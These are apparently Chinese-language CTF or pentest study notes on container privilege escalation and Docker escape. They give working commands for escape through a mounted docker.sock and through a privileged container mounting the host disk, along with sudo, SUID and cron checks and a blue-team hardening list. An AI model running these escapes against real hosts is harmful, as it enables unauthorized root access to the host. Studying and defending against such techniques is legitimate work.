# 04 提权与容器逃逸

获取 WebShell（通常处于容器内部，权限较低）后，下一步目标是提权到容器内的 root，或者直接通过 Docker 配置不当逃逸到宿主机。

## 1. 容器内部基础信息收集

首先确认当前所处环境和权限：

```bash
whoami
id
uname -a
cat /etc/os-release
```

**判断是否在容器内**：
```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```
如果存在 `/.dockerenv` 文件，或 cgroup 信息中包含 docker，说明当前处于容器内部。

## 2. 容器内提权（Linux 常规提权）

如果容器内只是个普通的 Linux 环境，可以尝试常规提权手法：

### 检查 Sudo 权限
```bash
sudo -l
```
如果当前用户能以 root 执行某些命令（如 `find`、`vim`、`less`），可以通过 GTFOBins 提权。

### 检查 SUID 文件
```bash
find / -perm -4000 -type f 2>/dev/null
```
寻找可利用的 SUID 程序（如异常的 `bash`、`nmap`、`cp` 等）。

### 检查计划任务
```bash
ls -la /etc/cron*
cat /etc/crontab
```

## 3. Docker 容器逃逸

如果容器被配置为特权模式或挂载了敏感文件，可以直接逃逸到宿主机。

### 检查是否挂载了 Docker Socket
```bash
ls -la /var/run/docker.sock
```
如果该文件存在且有读写权限，可以直接控制宿主机的 Docker 引擎，创建挂载宿主机根目录的新容器，从而逃逸。

**利用 Docker Socket 逃逸**：
```bash
# 查看宿主机 Docker 信息
docker -H unix:///var/run/docker.sock info

# 创建一个挂载宿主机根目录到容器 /mnt 的容器，并拿到 shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```
进入后，你就相当于拥有了宿主机的 root 权限。

### 检查是否为特权模式（Privileged）
```bash
capsh --print
cat /proc/self/status | grep CapEff
```
如果发现拥有全部 Capabilities（如 `cap_sys_admin`），说明是特权容器。

**特权容器逃逸**：
```bash
# 挂载宿主机磁盘到容器
mkdir /tmp/host
mount /dev/sda1 /tmp/host

# 修改宿主机的 authorized_keys 或直接读取 /root/flag
cat /tmp/host/root/flag
```

## 4. 踩坑记录

- **容器内没有 Docker 命令**：如果容器内没装 Docker，可以直接用 `curl` 调用 Docker API，或者下载一个静态编译的 Docker 客户端。
- **权限不足**：挂载宿主机磁盘需要 `CAP_SYS_ADMIN` 权限，如果不是特权容器，此方法无效，需寻找其他逃逸路径。

## 5. 防御建议（蓝队视角）

- **禁用特权模式**：启动容器时不要使用 `--privileged` 参数。
- **限制挂载**：不要将 `/var/run/docker.sock` 挂载到容器内，也不要把宿主机根目录挂载进去。
- **最小权限**：容器内进程不要以 root 运行，使用非 root 用户。
- **开启安全模块**：启用 AppArmor、SELinux 或 Seccomp，限制容器内的高危系统调用。
